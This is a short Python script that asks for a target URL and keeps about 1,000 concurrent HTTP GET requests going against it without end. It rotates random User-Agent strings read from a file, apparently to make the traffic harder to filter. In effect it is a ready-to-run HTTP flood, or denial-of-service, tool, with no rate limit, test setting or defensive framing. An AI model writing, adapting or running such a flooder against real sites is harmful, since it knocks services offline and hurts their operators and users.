import aiohttp
import asyncio
import random

ua = open('ua.txt', 'r').read().split('\n')

async def make_request(url):
    headers = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/octet-stream",
        "Accept-Language": "en-US,en;q=0.9,ja;q=0.8",
        "Custom-Header": "value",
        "Another-Header": "value",
        "connection":"Keep-Alive"
    }

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as response:
                status = response.status
                text = await response.text()
                return status, text
        except aiohttp.ClientError as e:
            print("An error occurred:", e)
            return None, None

async def main():
    url = input("Enter URL: ")
    tasks = set()  

    num_tasks = 1000  

    for _ in range(num_tasks):
        task = asyncio.create_task(make_request(url))
        tasks.add(task)

    while tasks:
        completed, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)

        for task in completed:
            tasks.remove(task)  
            status, response = await task
            if status is not None:
                print("Status:", status)

            new_task = asyncio.create_task(make_request(url))
            tasks.add(new_task)  

try:
    asyncio.run(main())
except KeyboardInterrupt:
    pass